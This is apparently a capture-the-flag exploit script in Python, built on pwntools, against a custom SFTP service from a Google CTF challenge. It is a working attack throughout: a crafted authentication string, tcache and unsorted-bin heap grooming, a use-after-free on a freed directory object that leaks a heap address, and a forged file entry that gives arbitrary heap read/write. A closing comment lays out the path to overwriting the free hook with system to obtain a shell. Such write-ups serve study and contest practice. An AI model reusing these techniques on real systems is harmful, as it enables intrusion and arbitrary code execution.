#!/usr/bin/env python
from pwn import *
import time, struct

def auth():
	print p.recvuntil("? ")
	p.send("yes")
	print p.recvuntil(": ")
	p.send("%H$I%H%I%I%I$I\n")
	print p.recvuntil("sftp.google.ctf.\n")
	print p.recvuntil("sftp> ")

def exit():
	p.sendline("exit")

def bye():
	p.sendline("bye")

def put(path, value):
	buf = "put %s" % path
	buf = buf.ljust(8201) #original length. That's how I can avoid sending "\n" w/o time
	p.send(buf)
	p.send(str(len(value)).ljust(15))
	p.send(value)
	print p.recvuntil("sftp> ")
        

def get(path):
	cmd = "get %s" % path
	p.sendline(cmd)
	print "Size received:"
	print p.recvuntil("\n")	#until the size
	print "Rest received:"
	print p.recvuntil("sftp> ")

def get_leak(path):
	cmd = "get %s" % path
	p.sendline(cmd)
	b = p.recvuntil("sftp> ")
	return b

def pwd():
	p.sendline("pwd")
	print p.recvuntil("sftp> ")

def cd(path):
	p.sendline("cd %s" % path)
	print p.recvuntil("sftp> ")

def ls(path = ""):
	if path == "":
		p.sendline("ls")
	else:
		p.sendline("ls %s" % path)
	print p.recvuntil("sftp> ")

def ls_get(path = ""):
	if path == "":
		p.sendline("ls")
	else:
		p.sendline("ls %s" % path)
	b = p.recvuntil("sftp> ")
	return b


def ls_leak(pattern):
	p.sendline("ls")
	b = p.recvuntil("sftp> ")
	if pattern in b:
		print "Data file_entry overlap achieved!!!!!!"
		return 1
	else:
		#print "ls return normal."
		return 0
	
def mkdir(path):
	p.sendline("mkdir %s" % path)
	print p.recvuntil("sftp> ")

def rm(path):
	p.sendline("rm %s" % path)
	print p.recvuntil("sftp> ")

def rmdir(path):
	p.sendline("rmdir %s" % path)
	print p.recvuntil("sftp> ")

def symlink(oldpath, newpath):
	p.sendline("symlink %s %s" % (oldpath, newpath))
	print p.recvuntil("sftp> ")

REMOTE = False

context.update(arch='amd64')
cwd = './'
bin = os.path.join(cwd, 'sftp_uaf')

execute = [
    # 'b *0x155554fd315a',
    # 'continue'
]
execute = flat(map(lambda x: x + '\n', execute))

if REMOTE:
	p = remote('sftp.ctfcompetition.com', 1337)
else:
	p = process(bin, cwd=cwd, aslr=True)

auth()

#So first we create two directories.

mkdir("/home/c01db33f/pwd1")
mkdir("/home/c01db33f/pwd2")

#Now we go into the second directory

cd("/home/c01db33f/pwd1")

#Now we setup a file where we will leak from originally.

put("/home/c01db33f/pwd1/foobar", "a"*32)

#Now we prime the tcache so that it does not get in the way.

for i in range(0, 7):
    mkdir("/home/c01db33f/foobar_%i" % i)

for i in range(0, 7):
    rmdir("/home/c01db33f/foobar_%i" % i)


#Ok, now the tcache is full, so the directory_entry_t will go to the unsorted bin.

#lets delete the pwd. this frees the directory_entry object
#onto the unsorted bin. Ofc that corrupts the first 16 bytes of if,
#which is the parenty pointer, the type and half of the name.
#but, when find_entry()'ing from the pwd, these fields don't matter at all, so it is ok.

rmdir("/home/c01db33f/pwd1")

#now the directory_entry object has been freed, but pwd pointer has not changed.
#now we want to do a new allocation by targetting the existing /home/c01db33f/pwd1/foobar

#the put has to use a path that is relative addressing, otherwise we go from root not pwd
#and it fails.

#when we do a put with relative path, we trigger a find_file(), which will walk from the pwd.
#this walking affects the child[] array of the object, which has absolutely
#not been trashed by the heap. alas, it will match foobar and do a new allocation
#to satisfy the size request.

#This results in splitting up pwd1's directory_entry_t object that is on the unsorted bin
#and finally giving us partial write access to the first child pointer. We use this to modify
#its LSB such that it is moved ahead 0x1C, which will mean that the child[0]->name will instead point to the original child[0]->data field, therefore an ls of this item will leak out the data pointer value.

#we overwrite the following fields:
'''
p64(0) - entry.parent_directory = NULL
p32(1) - entry.type = DIRECTORY_ENTRY
20*"C" - name
p64(1) - child count
"\x8C" - LSB of child[0] - see description why we use 0x8C:
'''

'''
after UAF free trigger, the pwd points to:

pwndbg> x/gx 0x56214b4d4000+0x204058
0x56214b6d8058:	0x000056214bc83310

Here we have:

pwndbg> malloc_chunk 0x000056214bc83300
0x56214bc83300 PREV_INUSE {
  mchunk_prev_size = 0,
  mchunk_size = 177,
  fd = 0x7f34c2d13ca0 <main_arena+96>,
  bk = 0x7f34c2d13ca0 <main_arena+96>,
  fd_nextsize = 0x0,
  bk_nextsize = 0x0
}
pwndbg> x/8gx 0x000056214bc83310
0x56214bc83310:	0x00007f34c2d13ca0	0x00007f34c2d13ca0
0x56214bc83320:	0x0000000000000000	0x0000000000000000
0x56214bc83330:	0x0000000000000010	0x000056214bc83470
0x56214bc83340:	0x0000000000000000	0x0000000000000000

So now we need to modify 0x000056214bc83470 so that at +C it has what it should have at +0x28.
-> 0x70 + (0x28 - 0xC) = 0x70 + 0x1C = 0x8C.
'''

put("foobar", p64(0) + p32(1) + "C"*20 + p64(1) + "\x8C")

out = ls_get()
print "received %d bytes" % len(out)

for b in out:
    print "0x%02X" % ord(b)

#The first 6 bytes of this leak is the heap address.
heap_addr = unpack(out[:6], 8*6, endian='little')
print "Leaked heap address: 0x%08x" % heap_addr
heap_base = heap_addr - 0x310

#Now we switch to the second pwd and redo this whole business.
#With this step, accessing /home/c01db33f/pwd1 is gone forever.
cd("/home/c01db33f/pwd2")

#To get proper clean situation, let's consume the leftover chunk of the unsorted bin.
#This adds more corruption to the original pwd, we could leverage that, but we'd rather
#leave it alone, it's a bit cleaner.

#We have 0x70 size unsorted bin chunk left.
#file_entry_t is 0x30. +0x10*2 for headers, so leaves 0x20 for data size.
#This has double use also, because it will be the chunk we modify to hit the UAF.
put("foobar2", 0x20*"D")

#Ok, now the tcache for directory_entry_t size is full, but all other bins are empty.
#So just like in the beginning!

#In that case, let's just create a chunk of data that we prep with known
#values so that it has inside of it a fake user chunk and then do the UAF again
#to get the corruption of the directory_entry_t for pwd2, this time fully overwriting
#the child pointer so that it points to the fake child pointer.
#the fake child pointer will then allow arbitrary read/write of the heap pretty much,
#because it will have its data pointer as heap_base and size as 0xFFFF.

#gdb.attach(p) #break the malloc to get the address we get back.
               #so that we know what to target in the UAF overwrite.

foobar2_chunk_addr = (0x55ff9e9399b0 - 0x55ff9e939000) + heap_base
print "data object to be used as fake file_entry_t at 0x%08x" % foobar2_chunk_addr

#we are assigning still to foobar2 so we dont trigger a new file_entry_t.
put("foobar2", p64(0) + p32(2) + "foobar2\x00".ljust(20) + p64(0xFFFF) + p64(heap_base))

#now we trigger the free of UAF the 2nd time
rmdir("/home/c01db33f/pwd2")

#and now we again assign to foobar2, again new allocation, this time overlapping
#the directory_entry_t of pwd2, making the foobar2_chunk_addr become the fake file_entry_t for
#foobar2
put("foobar2", p64(0) + p32(1) + "C"*20 + p64(2) + p64(foobar2_chunk_addr) + p64(0))

#finally: via "foobar2", we can directly R/W the entire heap.
get("foobar2") #this will print out 0xFFFF from the heap. We have won from here.

'''
One option to win:

1. Due to us using unsorted bin chunks, there will be libc addresses on the heap.
2. Leaking the entire heap in one step, gets us the libc address -> we can figure out where the free hook is.
3. Write back the heap content the same way, except modify a data pointer to point to the free hook as well as modify the parent pointer of a desired file object so that it reads "/bin//sh". No steps use that pointer from here, so it doesn't matter that it is garbage as a pointer value.
4. Rewrite free hook from 0 to system.
5. Call an rm to free the desired file - this results in system('/bin/sh')
'''

p.interactive()
